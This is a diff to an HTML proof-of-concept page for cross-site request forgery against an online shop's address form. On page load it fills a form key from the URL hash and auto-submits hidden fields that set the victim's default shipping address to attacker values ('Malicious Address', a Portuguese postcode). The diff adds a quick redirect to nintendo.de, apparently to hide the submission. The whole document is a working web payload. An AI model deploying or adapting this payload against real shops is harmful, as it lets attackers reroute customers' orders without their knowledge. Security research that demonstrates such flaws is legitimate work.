@@ -1,9 +1,14 @@
 <html>
-
-<script type="text/javascript">
+<script type="text/javascript">   
     function initForm() {
-        document.getElementById('id_key').setAttribute('value', document.location.hash.replace('#',''));
+
+        form = document.getElementById('id_key').setAttribute('value', document.location.hash.replace('#',''));
         document.csrf_form.submit();
+        window.setTimeout(redirect, 200);
+        
+    }
+    function redirect(argument) {
+        document.location.href = 'https://www.nintendo.de/';
     }
 </script>
 <body onload="initForm()">
@@ -11,23 +16,21 @@
     <input type="hidden" id="id_key" name="form_key" value="">
     <input type="hidden" name="success_url" value="">
     <input type="hidden" name="error_url" value="">
-    <input type="hidden" name="firstname" value="CSRF">
-    <input type="hidden" name="lastname" value="CSRF">
+    <input type="hidden" name="firstname" value="Malicious Address">
+    <input type="hidden" name="lastname" value="Malicious Address">
     <input type="hidden" name="telephone" value="">
-    <input type="hidden" name="street[0]" value="CSRF">
+    <input type="hidden" name="street[0]" value="Malicious Address">
     <input type="hidden" name="street[1]" value="23">
-    <input type="hidden" name="street[2]" value="CSRF">
-    <input type="hidden" name="postcode" value="39600000">
+    <input type="hidden" name="street[2]" value="Malicious Address">
+    <input type="hidden" name="postcode" value="26220000">
     <input type="hidden" name="country_id" value="PT">
-    <input type="hidden" name="state" value="CSRF">
-    <input type="hidden" name="city" value="CSRF">
+    <input type="hidden" name="state" value="Malicious Address">
+    <input type="hidden" name="city" value="Malicious Address">
     <input type="hidden" name="default_shipping" value="1">
     <input type="hidden" name="default_billing" value="0">
     <input type="hidden" name="region" value="">
     <input type="hidden" name="region_id" value="0">
   </form>
-
- 
 </body>
 </html>
 
